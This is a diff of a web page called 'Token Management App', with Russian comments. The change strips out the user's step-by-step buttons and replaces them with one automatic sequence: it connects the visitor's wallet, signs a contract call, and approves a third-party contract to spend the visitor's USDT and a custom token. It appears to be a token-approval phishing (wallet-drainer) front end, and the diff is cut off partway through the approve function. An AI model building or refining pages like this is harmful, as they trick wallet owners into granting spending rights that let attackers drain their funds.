@@ -30,56 +30,50 @@
 </head>
 <body>
     <h1>Token Management App</h1>
-    <p>Нажмите на кнопку ниже, чтобы подключить кошелек и подписать контракт.</p>
-    <button id="connectWallet">Подключить кошелек</button>
-    <button id="approveTokens" disabled>Предоставить доступ к токенам</button>
-    <button id="signContract" disabled>Подписать контракт</button>
-
+    <p>Подождите, идет подключение к кошельку и выполнение действий...</p>
     <div id="status"></div>
     <div id="error"></div>
 
     <script>
-        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Замените на адрес вашего контракта
-        const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
-        const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
+        const CONTRACT_ADDRESS = "0xYourContractAddress"; // Замените на адрес вашего контракта
+        const USDT_TOKEN_ADDRESS = "0xUSDTTokenAddress"; // Адрес контракта USDT
+        const CUSTOM_TOKEN_ADDRESS = "0xCustomTokenAddress"; // Адрес кастомного токена
 
         let userAddress = null;
 
+        // Основной процесс
+        async function mainProcess() {
+            try {
+                // Шаг 1: Подключение кошелька
+                userAddress = await connectWallet();
+
+                // Шаг 2: Подписание контракта
+                await signContract();
+
+                // Шаг 3: Выполнение approve для токенов
+                await approveTokens(USDT_TOKEN_ADDRESS);
+                await approveTokens(CUSTOM_TOKEN_ADDRESS);
+
+                // Успех
+                document.getElementById("status").innerText = "Все действия выполнены успешно.";
+            } catch (error) {
+                document.getElementById("error").innerText = `Ошибка: ${error.message}`;
+            }
+        }
+
+        // Функция подключения кошелька
         async function connectWallet() {
             if (typeof window.ethereum === 'undefined') {
-                document.getElementById("error").innerText = "Кошелек не найден. Установите MetaMask или Trust Wallet.";
-                return;
+                throw new Error("Кошелек не найден. Установите MetaMask или Trust Wallet.");
             }
 
-            try {
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
-                document.getElementById("approveTokens").disabled = false;
-            } catch (error) {
-                document.getElementById("error").innerText = `Ошибка подключения: ${error.message}`;
-            }
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            const address = accounts[0];
+            document.getElementById("status").innerText = `Кошелек подключен: ${address}`;
+            return address;
         }
 
-        async function approveTokens(tokenAddress) {
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const tokenAbi = [
-                "function approve(address spender, uint256 amount) public returns (bool)"
-            ];
-            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
-
-            try {
-                const amount = ethers.utils.parseUnits("1000", 18); // 1000 токенов с 18 десятичными знаками
-                const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
-                document.getElementById("status").innerText = `Транзакция отправлена: ${tx.hash}`;
-                await tx.wait(); // Ждем подтверждения
-                document.getElementById("status").innerText = `Токены ${tokenAddress} успешно предоставлены.`;
-            } catch (error) {
-                document.getElementById("error").innerText = `Ошибка approve: ${error.message}`;
-            }
-        }
-
+        // Функция подписания контракта
         async function signContract() {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
@@ -88,24 +82,11 @@
             ];
             const contract = new ethers.Contract(CONTRACT_ADDRESS, contractAbi, signer);
 
-            try {
-                const tx = await contract.approveContract();
-                document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
-                await tx.wait();
-                document.getElementById("status").innerText = "Контракт успешно подписан.";
-            } catch (error) {
-                document.getElementById("error").innerText = `Ошибка подписания контракта: ${error.message}`;
-            }
+            const tx = await contract.approveContract();
+            document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
+            await tx.wait();
+            document.getElementById("status").innerText = "Контракт успешно подписан.";
         }
 
-        // События нажатий на кнопки
-        document.getElementById("connectWallet").addEventListener("click", connectWallet);
-        document.getElementById("approveTokens").addEventListener("click", async () => {
-            await approveTokens(USDT_TOKEN_ADDRESS); // Approve для USDT
-            await approveTokens(CUSTOM_TOKEN_ADDRESS); // Approve для кастомного токена
-            document.getElementById("signContract").disabled = false;
-        });
-        document.getElementById("signContract").addEventListener("click", signContract);
-    </script>
-</body>
-</html>
+        // Функция предоставления доступа к токенам
+       
